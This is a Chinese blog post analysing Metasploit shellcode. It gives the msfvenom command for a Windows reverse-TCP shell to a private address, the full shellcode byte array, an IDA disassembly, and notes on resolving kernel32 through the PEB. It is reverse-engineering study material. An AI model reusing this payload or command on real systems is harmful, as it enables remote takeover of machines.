@@ -1,0 +1,647 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    MSF的shellcode分析 |
+    
+    Aiyakami的博客
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="基本分析 生成指令： 1msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.1.1 LPORT&#x3D;1111 -f c  生成结果： 12345678910111213141516171819202122232425unsigned char buf[] &#x3D; &quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSF的shellcode分析">
+<meta property="og:url" content="http://example.com/2025/02/06/MSF%E7%9A%84shellcode%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Aiyakami的博客">
+<meta property="og:description" content="基本分析 生成指令： 1msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.1.1 LPORT&#x3D;1111 -f c  生成结果： 12345678910111213141516171819202122232425unsigned char buf[] &#x3D; &quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://aiyakami.github.io/about/6/wps1-20250206203710-q37t9s6.jpg">
+<meta property="og:image" content="https://aiyakami.github.io/about/6/wps2-20250206203710-uwmhpxt.jpg">
+<meta property="og:image" content="https://aiyakami.github.io/about/6/wps3-20250206203710-dth1b2x.jpg">
+<meta property="og:image" content="https://aiyakami.github.io/about/6/wps4-20250206203710-2u84v00.jpg">
+<meta property="og:image" content="https://aiyakami.github.io/about/6/wps5-20250206203710-5v8xo0h.jpg">
+<meta property="og:image" content="https://aiyakami.github.io/about/6/wps6-20250206203710-lpk6lfr.jpg">
+<meta property="article:published_time" content="2025-02-06T12:42:21.086Z">
+<meta property="article:modified_time" content="2025-02-06T12:42:53.508Z">
+<meta property="article:author" content="aiyakami">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://aiyakami.github.io/about/6/wps1-20250206203710-q37t9s6.jpg">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Aiyakami的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="MSF的shellcode分析">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">MSF的shellcode分析</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-MSF的shellcode分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/02/06/MSF%E7%9A%84shellcode%E5%88%86%E6%9E%90/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-02-06T12:42:21.086Z" itemprop="datePublished">2025-02-06</time>
+    <time style="display: none;" id="post-update-time">2025-02-06</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p><strong>基本分析</strong></p>
+<p>生成指令：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> LPORT=<span class="number">1111</span> -f c</span><br></pre></td></tr></table></figure>
+
+<p>生成结果：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">unsigned <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7&quot;</span></span><br><span class="line"><span class="string">&quot;\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3&quot;</span></span><br><span class="line"><span class="string">&quot;\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f&quot;</span></span><br><span class="line"><span class="string">&quot;\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x01\x01\x68\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x04\x57\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5&quot;</span></span><br><span class="line"><span class="string">&quot;\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46&quot;</span></span><br><span class="line"><span class="string">&quot;\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c&quot;</span></span><br><span class="line"><span class="string">&quot;\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>实际对应的汇编语言</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00404060</span>                 cld</span><br><span class="line">.data:<span class="number">00404061</span>                 call    loc_4040E8</span><br><span class="line">.data:<span class="number">00404066</span>                 pusha</span><br><span class="line">.data:<span class="number">00404067</span>                 mov     ebp, esp</span><br><span class="line">.data:00404069                 xor     eax, eax</span><br><span class="line">.data:0040406B                 mov     edx, fs:[eax+30h]</span><br><span class="line">.data:<span class="number">0040406F</span>                 mov     edx, [edx+0Ch]</span><br><span class="line">.data:<span class="number">00404072</span>                 mov     edx, [edx+14h]</span><br><span class="line">.data:<span class="number">00404075</span></span><br><span class="line">.data:<span class="number">00404075</span> loc_404075:                             ; CODE XREF: uchar * buf+<span class="number">86</span>↓j</span><br><span class="line">.data:<span class="number">00404075</span>                 mov     esi, [edx+28h]</span><br><span class="line">.data:00404078                 movzx   ecx, word ptr [edx+26h]</span><br><span class="line">.data:0040407C                 xor     edi, edi</span><br><span class="line">.data:0040407E</span><br><span class="line">.data:0040407E loc_40407E:                             ; CODE XREF: uchar * buf+2A↓j</span><br><span class="line">.data:0040407E                 lodsb</span><br><span class="line">.data:<span class="number">0040407F</span>                 cmp     al, 61h ; <span class="string">&#x27;a&#x27;</span></span><br><span class="line">.data:00404081                 jl      <span class="type">short</span> loc_404085</span><br><span class="line">.data:00404083                 sub     al, 20h ; <span class="string">&#x27; &#x27;</span></span><br><span class="line">.data:00404085</span><br><span class="line">.data:00404085 loc_404085:                             ; CODE XREF: uchar * buf+<span class="number">21</span>↑j</span><br><span class="line">.data:00404085                 ror     edi, 0Dh</span><br><span class="line">.data:00404088                 add     edi, eax</span><br><span class="line">.data:0040408A                 loop    loc_40407E</span><br><span class="line">.data:0040408C                 push    edx</span><br><span class="line">.data:<span class="number">0040408D</span>                 push    edi</span><br><span class="line">.data:0040408E                 mov     edx, [edx+10h]</span><br><span class="line">.data:00404091                 mov     ecx, [edx+3Ch]</span><br><span class="line">.data:00404094                 mov     ecx, [ecx+edx+78h]</span><br><span class="line">.data:00404098                 jecxz   <span class="type">short</span> loc_4040E2</span><br><span class="line">.data:0040409A                 add     ecx, edx</span><br><span class="line">.data:0040409C                 push    ecx</span><br><span class="line">.data:<span class="number">0040409D</span>                 mov     ebx, [ecx+20h]</span><br><span class="line">.data:004040A0                 add     ebx, edx</span><br><span class="line">.data:004040A2                 mov     ecx, [ecx+18h]</span><br><span class="line">.data:004040A5</span><br><span class="line">.data:004040A5 loc_4040A5:                             ; CODE XREF: uchar * buf+<span class="number">5F</span>↓j</span><br><span class="line">.data:004040A5                 jecxz   <span class="type">short</span> loc_4040E1</span><br><span class="line">.data:004040A7                 dec     ecx</span><br><span class="line">.data:004040A8                 mov     esi, [ebx+ecx*<span class="number">4</span>]</span><br><span class="line">.data:004040AB                 add     esi, edx</span><br><span class="line">.data:004040AD                 xor     edi, edi</span><br><span class="line">.data:004040AF</span><br><span class="line">.data:004040AF loc_4040AF:                             ; CODE XREF: uchar * buf+<span class="number">57</span>↓j</span><br><span class="line">.data:004040AF                 lodsb</span><br><span class="line">.data:004040B0                 ror     edi, 0Dh</span><br><span class="line">.data:004040B3                 add     edi, eax</span><br><span class="line">.data:004040B5                 cmp     al, ah</span><br><span class="line">.data:004040B7                 jnz     <span class="type">short</span> loc_4040AF</span><br><span class="line">.data:004040B9                 add     edi, [ebp-<span class="number">8</span>]</span><br><span class="line">.data:004040BC                 cmp     edi, [ebp+24h]</span><br><span class="line">.data:004040BF                 jnz     <span class="type">short</span> loc_4040A5</span><br><span class="line">.data:004040C1                 pop     eax</span><br><span class="line">.data:004040C2                 mov     ebx, [eax+24h]</span><br><span class="line">.data:004040C5                 add     ebx, edx</span><br><span class="line">.data:004040C7                 mov     cx, [ebx+ecx*<span class="number">2</span>]</span><br><span class="line">.data:004040CB                 mov     ebx, [eax+1Ch]</span><br><span class="line">.data:004040CE                 add     ebx, edx</span><br><span class="line">.data:004040D0                 mov     eax, [ebx+ecx*<span class="number">4</span>]</span><br><span class="line">.data:004040D3                 add     eax, edx</span><br><span class="line">.data:004040D5                 mov     [esp+28h+var_4], eax</span><br><span class="line">.data:004040D9                 pop     ebx</span><br><span class="line">.data:004040DA                 pop     ebx</span><br><span class="line">.data:004040DB                 popa</span><br><span class="line">.data:004040DC                 pop     ecx</span><br><span class="line">.data:004040DD                 pop     edx</span><br><span class="line">.data:004040DE                 push    ecx</span><br><span class="line">.data:004040DF                 jmp     eax</span><br><span class="line">.data:<span class="number">004040E1</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.data:<span class="number">004040E1</span></span><br><span class="line">.data:<span class="number">004040E1</span> loc_4040E1:                             ; CODE XREF: uchar * buf:loc_4040A5↑j</span><br><span class="line">.data:<span class="number">004040E1</span>                 pop     edi</span><br><span class="line">.data:<span class="number">004040E2</span></span><br><span class="line">.data:<span class="number">004040E2</span> loc_4040E2:                             ; CODE XREF: uchar * buf+<span class="number">38</span>↑j</span><br><span class="line">.data:<span class="number">004040E2</span>                 pop     edi</span><br><span class="line">.data:<span class="number">004040E3</span>                 pop     edx</span><br><span class="line">.data:<span class="number">004040E4</span>                 mov     edx, [edx]</span><br><span class="line">.data:<span class="number">004040E6</span>                 jmp     <span class="type">short</span> loc_404075</span><br><span class="line">.data:<span class="number">004040E6</span> ?buf@@3PAEA     endp ; sp-analysis failed</span><br><span class="line">.data:<span class="number">004040E6</span></span><br><span class="line">.data:<span class="number">004040E8</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.data:<span class="number">004040E8</span></span><br><span class="line">.data:<span class="number">004040E8</span> loc_4040E8:                             ; CODE XREF: uchar * buf+<span class="number">1</span>↑p</span><br><span class="line">.data:<span class="number">004040E8</span>                 pop     ebp</span><br><span class="line">.data:<span class="number">004040E9</span>                 push    3233h</span><br><span class="line">.data:004040EE                 push    5F327377h</span><br><span class="line">.data:004040F3                 push    esp</span><br><span class="line">.data:004040F4                 push    726774Ch</span><br><span class="line">.data:004040F9                 call    ebp</span><br><span class="line">.data:004040FB                 mov     eax, 190h</span><br><span class="line">.data:<span class="number">00404100</span>                 sub     esp, eax</span><br><span class="line">.data:<span class="number">00404102</span>                 push    esp</span><br><span class="line">.data:<span class="number">00404103</span>                 push    eax</span><br><span class="line">.data:<span class="number">00404104</span>                 push    6B8029h</span><br><span class="line">.data:00404109                 call    ebp</span><br><span class="line">.data:0040410B                 push    eax</span><br><span class="line">.data:0040410C                 push    eax</span><br><span class="line">.data:<span class="number">0040410D</span>                 push    eax</span><br><span class="line">.data:0040410E                 push    eax</span><br><span class="line">.data:<span class="number">0040410F</span>                 inc     eax</span><br><span class="line">.data:<span class="number">00404110</span>                 push    eax</span><br><span class="line">.data:<span class="number">00404111</span>                 inc     eax</span><br><span class="line">.data:<span class="number">00404112</span>                 push    eax</span><br><span class="line">.data:<span class="number">00404113</span>                 push    0E0DF0FEAh</span><br><span class="line">.data:00404118                 call    ebp</span><br><span class="line">.data:0040411A                 xchg    eax, edi</span><br><span class="line">.data:0040411B                 push    <span class="number">5</span></span><br><span class="line">.data:<span class="number">0040411D</span>                 push    101A8C0h</span><br><span class="line">.data:<span class="number">00404122</span>                 push    57040002h</span><br><span class="line">.data:<span class="number">00404127</span>                 mov     esi, esp</span><br><span class="line">.data:00404129</span><br><span class="line">.data:00404129 loc_404129:                             ; CODE XREF: .data:0040413B↓j</span><br><span class="line">.data:00404129                 push    10h</span><br><span class="line">.data:0040412B                 push    esi</span><br><span class="line">.data:0040412C                 push    edi</span><br><span class="line">.data:<span class="number">0040412D</span>                 push    6174A599h</span><br><span class="line">.data:<span class="number">00404132</span>                 call    ebp</span><br><span class="line">.data:<span class="number">00404134</span>                 test    eax, eax</span><br><span class="line">.data:<span class="number">00404136</span>                 jz      <span class="type">short</span> loc_404144</span><br><span class="line">.data:00404138                 dec     dword ptr [esi+<span class="number">8</span>]</span><br><span class="line">.data:0040413B                 jnz     <span class="type">short</span> loc_404129</span><br><span class="line">.data:<span class="number">0040413D</span>                 push    56A2B5F0h</span><br><span class="line">.data:<span class="number">00404142</span>                 call    ebp</span><br><span class="line">.data:<span class="number">00404144</span></span><br><span class="line">.data:<span class="number">00404144</span> loc_404144:                             ; CODE XREF: .data:<span class="number">00404136</span>↑j</span><br><span class="line">.data:<span class="number">00404144</span>                 push    646D63h</span><br><span class="line">.data:00404149                 mov     ebx, esp</span><br><span class="line">.data:0040414B                 push    edi</span><br><span class="line">.data:0040414C                 push    edi</span><br><span class="line">.data:<span class="number">0040414D</span>                 push    edi</span><br><span class="line">.data:0040414E                 xor     esi, esi</span><br><span class="line">.data:<span class="number">00404150</span>                 push    12h</span><br><span class="line">.data:<span class="number">00404152</span>                 pop     ecx</span><br><span class="line">.data:<span class="number">00404153</span></span><br><span class="line">.data:<span class="number">00404153</span> loc_404153:                             ; CODE XREF: .data:<span class="number">00404154</span>↓j</span><br><span class="line">.data:<span class="number">00404153</span>                 push    esi</span><br><span class="line">.data:<span class="number">00404154</span>                 loop    loc_404153</span><br><span class="line">.data:<span class="number">00404156</span>                 mov     word ptr [esp+3Ch], 101h</span><br><span class="line">.data:<span class="number">0040415D</span>                 lea     eax, [esp+10h]</span><br><span class="line">.data:<span class="number">00404161</span>                 mov     <span class="type">byte</span> ptr [eax], 44h ; <span class="string">&#x27;D&#x27;</span></span><br><span class="line">.data:<span class="number">00404164</span>                 push    esp</span><br><span class="line">.data:<span class="number">00404165</span>                 push    eax</span><br><span class="line">.data:<span class="number">00404166</span>                 push    esi</span><br><span class="line">.data:<span class="number">00404167</span>                 push    esi</span><br><span class="line">.data:00404168                 push    esi</span><br><span class="line">.data:00404169                 inc     esi</span><br><span class="line">.data:0040416A                 push    esi</span><br><span class="line">.data:0040416B                 dec     esi</span><br><span class="line">.data:0040416C                 push    esi</span><br><span class="line">.data:<span class="number">0040416D</span>                 push    esi</span><br><span class="line">.data:0040416E                 push    ebx</span><br><span class="line">.data:<span class="number">0040416F</span>                 push    esi</span><br><span class="line">.data:<span class="number">00404170</span>                 push    863FCC79h</span><br><span class="line">.data:<span class="number">00404175</span>                 call    ebp</span><br><span class="line">.data:<span class="number">00404177</span>                 mov     eax, esp</span><br><span class="line">.data:00404179                 dec     esi</span><br><span class="line">.data:0040417A                 push    esi</span><br><span class="line">.data:0040417B                 inc     esi</span><br><span class="line">.data:0040417C                 push    dword ptr [eax]</span><br><span class="line">.data:0040417E                 push    601D8708h</span><br><span class="line">.data:00404183                 call    ebp</span><br><span class="line">.data:00404185                 mov     ebx, 56A2B5F0h</span><br><span class="line">.data:0040418A                 push    9DBD95A6h</span><br><span class="line">.data:<span class="number">0040418F</span>                 call    ebp</span><br><span class="line">.data:00404191                 cmp     al, <span class="number">6</span></span><br><span class="line">.data:00404193                 jl      <span class="type">short</span> loc_40419F</span><br><span class="line">.data:00404195                 cmp     bl, 0E0h</span><br><span class="line">.data:00404198                 jnz     <span class="type">short</span> loc_40419F</span><br><span class="line">.data:0040419A                 mov     ebx, 6F721347h</span><br><span class="line">.data:<span class="number">0040419F</span></span><br><span class="line">.data:<span class="number">0040419F</span> loc_40419F:                             ; CODE XREF: .data:00404193↑j</span><br><span class="line">.data:<span class="number">0040419F</span>                                         ; .data:00404198↑j</span><br><span class="line">.data:<span class="number">0040419F</span>                 push    <span class="number">0</span></span><br><span class="line">.data:004041A1                 push    ebx</span><br><span class="line">.data:004041A2                 call    ebp</span><br></pre></td></tr></table></figure>
+
+<p>但是上述shellcode当中可能存在有将数据当中代码的情况，并且需要找出这个分析失败的原因</p>
+<p>​<img src="https://aiyakami.github.io/about/6/wps1-20250206203710-q37t9s6.jpg">​</p>
+<p>只需要更改出错的函数的大小就行</p>
+<p>​<img src="https://aiyakami.github.io/about/6/wps2-20250206203710-uwmhpxt.jpg">​</p>
+<p>对应的反汇编</p>
+<p>​<img src="https://aiyakami.github.io/about/6/wps3-20250206203710-dth1b2x.jpg">​</p>
+<p><strong>动态获取kernelbase</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax, dword ptr fs : [<span class="number">0x30</span>]<span class="comment">//此处偏移就是PEB位置</span></span><br><span class="line">mov eax, dword ptr[eax+<span class="number">0xC</span>]<span class="comment">//模块列表LDR地址</span></span><br><span class="line">mov eax, dword ptr[eax + <span class="number">0x1C</span>]<span class="comment">//InInitializationOrderModuleList地址</span></span><br><span class="line">mov eax, [eax]<span class="comment">//使InInitializationOrderModuleList指向第二个元素，也就是该链表维护的第二个模块</span></span><br><span class="line">mov eax,dword ptr[eax+<span class="number">0x8</span>]<span class="comment">//dllbase距离链表的距离</span></span><br><span class="line">mov dwBase,eax<span class="comment">//第一个模块就是kernel32也有可能是kernelbase实际上是第二个模块</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>InMemoryOrderModuleList 是一个 _LIST_ENTRY 结构，定义了进程加载的模块按内存顺序排列的链表。链表中的每个节点代表一个加载的模块（通常是DLL）</th>
+</tr>
+</thead>
+</table>
+<p>所以</p>
+<p>+0x00c InLoadOrderModuleList : _LIST_ENTRY</p>
+<p>+0x014 InMemoryOrderModuleList : _LIST_ENTRY</p>
+<p>+0x01c InInitializationOrderModuleList : _LIST_ENTRY</p>
+<p>都可以访问到加载模块基地址，只是排列顺序不同，所以偏移不一样</p>
